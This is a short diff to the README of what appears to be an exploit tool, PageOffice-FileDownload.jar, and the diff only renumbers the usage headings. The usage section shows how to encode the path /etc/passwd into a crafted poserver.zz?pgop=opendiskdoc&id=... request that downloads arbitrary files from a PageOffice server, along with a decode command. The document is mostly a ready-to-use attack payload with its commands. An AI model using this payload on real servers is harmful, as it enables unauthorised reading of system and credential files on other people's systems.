@@ -7,14 +7,14 @@ jar -cvmf MANIFEST.MF PageOffice-FileDownload.jar *.class
 ## env
 `jdk1.8`
 ## Usage
-### encode
+### 1. encode
 ```
 java -jar PageOffice-FileDownload.jar encode /etc/passwd
 
 encode payload:
 poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnLDh2OCQpbSJyK2w4cj9uKzsXbiRqL2EXci9tIi0lYThjOCs5ciZjF2s=
 ```
-### decode
+### 2. decode
 ```
 java -jar PageOffice-FileDownload.jar decode KmcgY3MtLG0jY2VxJnQjZSYxYjVlcStwOmMmcWVkOXEpbiZtKC58Ln8tOXIXcDhzJCs
 
